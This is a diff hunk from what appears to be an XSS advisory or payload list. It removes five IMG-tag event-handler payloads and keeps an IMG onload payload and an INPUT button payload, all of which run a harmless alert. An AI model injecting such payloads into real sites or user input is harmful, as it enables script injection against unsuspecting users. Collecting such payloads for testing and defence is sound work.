@@ -37,11 +37,6 @@ An attacker can use yyy to send a malicious script to an unsuspecting user. The 
 
 
 
-<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onvolumechange="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">
 
 <IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
 <INPUT TYPE="BUTTON" action="alert('yyy')"/>
